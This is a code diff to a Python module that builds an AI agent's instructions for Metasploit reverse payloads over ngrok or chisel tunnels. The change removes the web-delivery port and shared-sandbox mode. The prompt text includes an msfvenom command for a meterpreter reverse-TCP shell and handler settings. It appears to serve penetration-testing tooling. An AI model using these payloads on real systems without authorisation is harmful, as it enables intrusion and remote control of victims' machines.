@@ -22,7 +22,7 @@ logger = logging.getLogger(__name__)
 
 #: The run's own sandbox (the tunnel lookups' default): the run scope's handle.
 _RUN = object()
-#: A per-user run that holds no sandbox: no tunnel is read anywhere.
+#: A run that holds no sandbox: no tunnel is read anywhere.
 _NO_SANDBOX = object()
 #: Replaced by the tests with an httpx.MockTransport; None is httpx's own.
 _async_transport = None
@@ -38,7 +38,7 @@ _tunnel_status: "OrderedDict[tuple, tuple]" = OrderedDict()
 _tunnel_refreshes: dict = {}
 _TUNNEL_HOST = re.compile(r"[A-Za-z0-9](?:[A-Za-z0-9-]{0,62})(?:\.[A-Za-z0-9](?:[A-Za-z0-9-]{0,62}))*")
 #: chisel forwards the handler port only (mcp/servers/tunnel_manager.py, R:4444).
-_CHISEL_PORT, _CHISEL_SRV_PORT = 4444, 8080
+_CHISEL_PORT = 4444
 
 
 def get_session_count() -> int:
@@ -72,7 +72,7 @@ def get_session_config_prompt() -> str:
     auto-discover the public tunnel URL, overriding LHOST and LPORT.
 
     When CHISEL_TUNNEL_ENABLED is True, LHOST is derived from
-    CHISEL_SERVER_URL and ports are deterministic (4444 + 8080).
+    CHISEL_SERVER_URL and the port is deterministic (4444, the only one chisel forwards).
 
     Returns:
         Formatted string with Metasploit commands for the agent.
@@ -84,8 +84,7 @@ def get_session_config_prompt() -> str:
     PAYLOAD_USE_HTTPS = get_setting('PAYLOAD_USE_HTTPS', False)
     NGROK_TUNNEL_ENABLED = get_setting('NGROK_TUNNEL_ENABLED', False)
     CHISEL_TUNNEL_ENABLED = get_setting('CHISEL_TUNNEL_ENABLED', False)
-    # Per-user mode: the run's own Kali sandbox (or _NO_SANDBOX before its first Kali
-    # call), whose ports are not the shared container's; None in shared mode.
+    # The run's own Kali sandbox, or _NO_SANDBOX before its first Kali call.
     sandbox = _tunnel_sandbox()
 
     # -------------------------------------------------------------------------
@@ -108,13 +107,11 @@ def get_session_config_prompt() -> str:
     # -------------------------------------------------------------------------
     chisel_active = False
     chisel_error = None
-    chisel_srv_port = None
     if CHISEL_TUNNEL_ENABLED and not ngrok_active:
         tunnel_info = _query_chisel_tunnel()
         if tunnel_info:
             LHOST = tunnel_info['host']
             LPORT = tunnel_info['port']
-            chisel_srv_port = tunnel_info.get('srv_port')
             chisel_active = True
         else:
             chisel_error = ("chisel tunnel enabled but CHISEL_SERVER_URL not set or invalid "
@@ -143,7 +140,7 @@ def get_session_config_prompt() -> str:
         if ngrok_active:
             lines += _section(f"""\
                 **ngrok Tunnel: ACTIVE** — public endpoint `{LHOST}:{LPORT}`
-                The Metasploit listener runs locally on kali-sandbox:4444.
+                The Metasploit listener runs inside your Kali sandbox on port 4444.
                 The target connects to the ngrok public URL, which tunnels traffic to your listener.
 
                 **CRITICAL: You MUST use REVERSE payloads (reverse_tcp or reverse_https).
@@ -155,10 +152,11 @@ def get_session_config_prompt() -> str:
     if CHISEL_TUNNEL_ENABLED:
         if chisel_active:
             lines += _section(f"""\
-                **Chisel Tunnel: ACTIVE** — handler `{LHOST}:{LPORT}` + web delivery `{LHOST}:{chisel_srv_port}`
-                The Metasploit listener runs locally on kali-sandbox:4444.
-                Web delivery / HTA server runs on kali-sandbox:8080.
+                **Chisel Tunnel: ACTIVE** — handler `{LHOST}:{LPORT}`
+                The Metasploit listener runs inside your Kali sandbox on port 4444.
                 The target connects to the VPS public IP, which tunnels traffic through chisel.
+                Only that one port is tunnelled: nothing else in your sandbox (no web
+                delivery or HTA server) is reachable from the target.
 
                 **CRITICAL: You MUST use REVERSE payloads (reverse_tcp or reverse_https).
                 NEVER use bind payloads — bind mode cannot work through a chisel tunnel
@@ -227,7 +225,7 @@ def get_session_config_prompt() -> str:
                 | **ReverseListenerBind** (where handler actually listens) | `127.0.0.1` | `4444` |
                 | **Payload / shell one-liner** (what the target connects to) | `{LHOST}` | `{LPORT}` |
 
-                ngrok forwards `{LHOST}:{LPORT}` → `127.0.0.1:4444` inside kali-sandbox.
+                ngrok forwards `{LHOST}:{LPORT}` → `127.0.0.1:4444` inside your Kali sandbox.
 
                 **Metasploit handler commands (inside msfconsole):**
                 ```
@@ -269,10 +267,8 @@ def get_session_config_prompt() -> str:
                 | **Metasploit handler** (inside msfconsole) | `{LHOST}` | `{LPORT}` |
                 | **ReverseListenerBind** (where handler actually listens) | `127.0.0.1` | `4444` |
                 | **Payload / shell one-liner** (what the target connects to) | `{LHOST}` | `{LPORT}` |
-                | **Web delivery / HTA SRVHOST** (Metasploit module setting) | `0.0.0.0` | `8080` |
-                | **Web delivery / HTA URL** (what the target downloads from) | `{LHOST}` | `{chisel_srv_port}` |
 
-                chisel forwards `{LHOST}:{LPORT}` -> `127.0.0.1:4444` and `{LHOST}:{chisel_srv_port}` -> `127.0.0.1:8080` inside kali-sandbox.
+                chisel forwards only `{LHOST}:{LPORT}` -> `127.0.0.1:4444` inside your Kali sandbox.
 
                 **Metasploit handler commands (inside msfconsole):**
                 ```
@@ -285,12 +281,10 @@ def get_session_config_prompt() -> str:
                 set DisablePayloadHandler false
                 ```
 
-                **For web delivery / HTA delivery (Method C & D):**
-                ```
-                set SRVHOST 0.0.0.0
-                set SRVPORT 8080
-                ```
-                The victim downloads from `http://{LHOST}:{chisel_srv_port}/...` which chisel tunnels to kali-sandbox:8080.
+                **No web delivery / HTA delivery (Method C & D) through chisel:** no server port
+                of yours is tunnelled, so a target cannot download a payload from your sandbox.
+                Pick a method that needs no download from you (Method A or B, a stageless
+                payload, or a command one-liner), or ask the user.
 
                 **For msfvenom standalone payloads (STAGELESS only):**
                 `msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST={LHOST} LPORT={LPORT} -f elf -o /tmp/shell.elf`
@@ -307,8 +301,7 @@ def get_session_config_prompt() -> str:
                 set LHOST {LHOST}
                 set LPORT {LPORT}
                 ```""")
-            if sandbox is not None:
-                lines += _section(_per_user_reverse_note(sandbox, LPORT))
+            lines += _section(_per_user_reverse_note(sandbox, LPORT))
 
         lines += _section("After exploit succeeds, use `msf_wait_for_session()` to wait for session.")
 
@@ -353,12 +346,12 @@ def get_session_config_prompt() -> str:
             lines += _section("""\
                 **Problem:** ngrok tunnel is enabled but the tunnel API is unreachable.
                 The user intended to use a REVERSE payload through ngrok, but the tunnel is not running.
-                Ask the user to check that the ngrok auth token is configured in Global Settings → Tunneling.""")
+                Ask the user to check that the ngrok auth token is configured in Settings → Tunneling.""")
         elif CHISEL_TUNNEL_ENABLED and chisel_error:
             lines += _section("""\
                 **Problem:** chisel tunnel is enabled but the chisel server URL is not set or invalid.
                 The user intended to use a REVERSE payload through chisel, but the tunnel is not configured.
-                Ask the user to check that the chisel server URL is configured in Global Settings → Tunneling.""")
+                Ask the user to check that the chisel server URL is configured in Settings → Tunneling.""")
         elif has_lhost and not has_lport:
             lines += _section("**Problem:** LHOST is set but LPORT is missing. For reverse payloads, both are required.")
         elif has_lport and not has_lhost:
@@ -383,28 +376,7 @@ def get_session_config_prompt() -> str:
         # the tunnel", which a LAN-IP suggestion would contradict.
         host_lan_ip = os.getenv("HOST_LAN_IP", "").strip()
         tunnel_configured = NGROK_TUNNEL_ENABLED or CHISEL_TUNNEL_ENABLED
-        if sandbox is not None:
-            lines += _section(_per_user_lhost_hint(sandbox, host_lan_ip, tunnel_configured))
-        else:
-            if host_lan_ip and not tunnel_configured:
-                suggest = (
-                    f"The host's detected LAN IP (default route) is `{host_lan_ip}` "
-                    "— suggest this as LHOST and confirm with the user. If they are "
-                    "on a VPN to reach the target, the VPN interface's IP is the "
-                    "right one instead."
-                )
-            else:
-                suggest = "ASK THE USER for it, do not run a command to find it."
-            lines += _section(f"""\
-                **⚠️ WHICH IP IS LHOST — DO NOT GUESS OR AUTO-DETECT IT.**
-                Your tools run inside the kali-sandbox container, whose own address
-                is a private `172.x` Docker IP that the target CANNOT reach. Reading
-                it (`ip addr` / `ifconfig` / `hostname -I`) gives the WRONG LHOST.
-                The correct LHOST is the **host machine's LAN IP** (e.g. your Kali
-                VM's `192.168.x.x`); the reverse handler's port 4444 is forwarded
-                from the host into the container, so the target connects to
-                `host-LAN-IP:LPORT`. You cannot discover the host's LAN IP from
-                inside the container — {suggest}""")
+        lines += _section(_per_user_lhost_hint(sandbox, host_lan_ip, tunnel_configured))
 
     lines += _section("Replace `<os>/<arch>` with target OS (e.g., `linux/x64`, `windows/x64`).")
 
@@ -442,7 +414,8 @@ def _per_user_lhost_hint(sandbox, host_lan_ip: str, tunnel_configured: bool) -> 
     return dedent(f"""\
         **⚠️ WHICH IP IS LHOST — DO NOT GUESS OR AUTO-DETECT IT.**
         Your tools run inside your own Kali sandbox, whose address is a private
-        Docker IP the target CANNOT reach. Its reverse-shell port `{pool}` is
+        Docker IP the target CANNOT reach: reading it (`ip addr` / `ifconfig` /
+        `hostname -I`) gives the WRONG LHOST. Its reverse-shell port `{pool}` is
         published on the host: use LPORT `{pool}` (the handler listens on `{pool}`
         inside the sandbox), and as LHOST the host's address the target can reach.
         The port answers from outside only if the operator published the pool on
@@ -461,20 +434,14 @@ def _per_user_reverse_note(sandbox, lport) -> str:
 
 
 def _tunnel_sandbox(handle=_RUN):
-    """Whose tunnels the lookups read: None in shared mode (today's instance tunnel), the
-    per-user handle (the run's own by default), or _NO_SANDBOX for a per-user run that
-    holds no sandbox yet, which reads nothing: never the shared container's tunnel nor
-    another person's."""
-    import sandbox_contract
+    """Whose tunnels the lookups read: the handle (the run's own by default), or
+    _NO_SANDBOX for a run that holds no sandbox yet, which reads nothing: never another
+    person's tunnel."""
     import sandbox_router
 
     if handle is _RUN:
         handle = sandbox_router.current_handle()
-    if handle is not None and handle.mode == sandbox_contract.MODE_PER_USER:
-        return handle
-    if handle is None and sandbox_router.current_mode() == sandbox_contract.MODE_PER_USER:
-        return _NO_SANDBOX
-    return None
+    return _NO_SANDBOX if handle is None else handle
 
 
 def tunnels_from_status(data) -> tuple:
@@ -496,8 +463,7 @@ def tunnels_from_status(data) -> tuple:
         ngrok = None
     return (
         {"host": ngrok["host"], "port": ngrok_port, "hostname": ngrok["host"]} if ngrok else None,
-        {"host": chisel["host"], "port": _CHISEL_PORT, "srv_port": _CHISEL_SRV_PORT,
-         "hostname": chisel["host"]} if chisel else None,
+        {"host": chisel["host"], "port": _CHISEL_PORT, "hostname": chisel["host"]} if chisel else None,
     )
 
 
@@ -579,13 +545,10 @@ def _forget_all_tunnel_status() -> None:
 
 def _query_ngrok_tunnel(handle=_RUN) -> dict | None:
     """
-    Query the ngrok API to get the public TCP tunnel URL.
-
-    Shared mode: ngrok runs inside kali-sandbox and exposes its API at
-    http://kali-sandbox:4040/api/tunnels within the Docker network. Per-user mode:
-    the run's own sandbox (or `handle`), as its tunnel manager on 8015 last answered
-    (ngrok's API listens on the sandbox's loopback only), never dialled from here: a
-    stale answer is read again in the background. Only the `own` view has a tunnel.
+    The public TCP endpoint of the ngrok tunnel of the run's own sandbox (or `handle`),
+    as its tunnel manager on 8015 last answered (ngrok's API listens on the sandbox's
+    loopback only), never dialled from here: a stale answer is read again in the
+    background. Only the `own` view has a tunnel.
 
     The hostname is returned as-is (not pre-resolved) because the agent
     container's DNS may resolve ngrok TCP relay hostnames to a different
@@ -594,48 +557,14 @@ def _query_ngrok_tunnel(handle=_RUN) -> dict | None:
 
     Returns:
         Dict with 'host' (str — ngrok hostname), 'port' (int), and
-        'hostname' (str — same as host) if a TCP tunnel is found,
-        or None if ngrok is unreachable or no tunnel exists.
+        'hostname' (str — same as host) if a TCP tunnel is up, else None.
     """
-    import requests
-
     import sandbox_contract
 
     target = _tunnel_sandbox(handle)
-    if target is _NO_SANDBOX:
+    if target is _NO_SANDBOX or target.view != sandbox_contract.VIEW_OWN:
         return None
-    if target is not None:
-        if target.view != sandbox_contract.VIEW_OWN:
-            return None
-        return tunnels_from_status(_cached_tunnel_status(target))[0]
-
-    try:
-        resp = requests.get("http://kali-sandbox:4040/api/tunnels", timeout=5)
-        resp.raise_for_status()
-        data = resp.json()
-
-        for tunnel in data.get("tunnels", []):
-            if tunnel.get("proto") == "tcp":
-                public_url = tunnel["public_url"]  # e.g. "tcp://0.tcp.ngrok.io:12345"
-                addr = public_url.replace("tcp://", "")
-                hostname, port_str = addr.rsplit(":", 1)
-                port = int(port_str)
-
-                logger.info(f"ngrok TCP tunnel: {hostname}:{port}")
-                return {
-                    "host": hostname,
-                    "port": port,
-                    "hostname": hostname,
-                }
-
-        logger.debug("ngrok API returned no TCP tunnels")
-        return None
-
-    except Exception as e:
-        # Not an error: a missing/unreachable tunnel is the normal state when
-        # ngrok is not configured. At WARNING this floods the log on every poll.
-        logger.debug(f"ngrok tunnel API unreachable: {e}")
-        return None
+    return tunnels_from_status(_cached_tunnel_status(target))[0]
 
 
 def _query_chisel_tunnel(handle=_RUN) -> dict | None:
@@ -644,27 +573,24 @@ def _query_chisel_tunnel(handle=_RUN) -> dict | None:
 
     Unlike ngrok (which requires an API query to discover random ports),
     chisel tunnels are deterministic: the VPS hostname from the chisel server URL
-    is the public endpoint, and the forwarded ports are always 4444 (handler)
-    and 8080 (web delivery / HTA server).
+    is the public endpoint, and the one forwarded port is 4444 (the handler).
 
     Returns:
-        Dict with 'host' (str), 'port' (int = 4444), 'srv_port' (int = 8080),
-        and 'hostname' (str) if chisel is configured,
-        or None if not configured.
+        Dict with 'host' (str), 'port' (int = 4444) and 'hostname' (str) if chisel
+        is configured, or None if not configured.
     """
     import os
     import requests as _requests
     from urllib.parse import urlparse
 
     import sandbox_contract
-    import sandbox_router
 
     target = _tunnel_sandbox(handle)
-    if target is _NO_SANDBOX or (target is not None and target.view != sandbox_contract.VIEW_OWN):
+    if target is _NO_SANDBOX or target.view != sandbox_contract.VIEW_OWN:
         return None
-    # The person whose tunnel it is: in per-user mode the webapp answers only that
-    # person's own config, while their tunnel is on.
-    person = target.user_id if target is not None else sandbox_router.sandbox_user()
+    # The person whose tunnel it is: the webapp answers only that person's own config,
+    # while their tunnel is on.
+    person = target.user_id
 
     # Fetch chisel URL from webapp (stored in UserSettings via Global Settings UI)
     webapp_url = os.environ.get("WEBAPP_API_URL", "http://webapp:3000")
@@ -672,7 +598,7 @@ def _query_chisel_tunnel(handle=_RUN) -> dict | None:
         resp = _requests.get(
             f"{webapp_url}/api/global/tunnel-config",
             headers={"X-Internal-Key": os.environ.get("INTERNAL_API_KEY", "")},
-            params={"userId": person} if person else None,
+            params={"userId": person},
             timeout=5,
         )
         resp.raise_for_status()
@@ -692,11 +618,10 @@ def _query_chisel_tunnel(handle=_RUN) -> dict | None:
             logger.warning(f"Cannot parse hostname from CHISEL_SERVER_URL: {chisel_url}")
             return None
 
-        logger.debug(f"chisel tunnel: {hostname}:4444 (handler) + {hostname}:8080 (web delivery)")
+        logger.debug(f"chisel tunnel: {hostname}:{_CHISEL_PORT} (handler)")
         return {
             "host": hostname,
-            "port": 4444,
-            "srv_port": 8080,
+            "port": _CHISEL_PORT,
             "hostname": hostname,
         }
     except Exception as e:
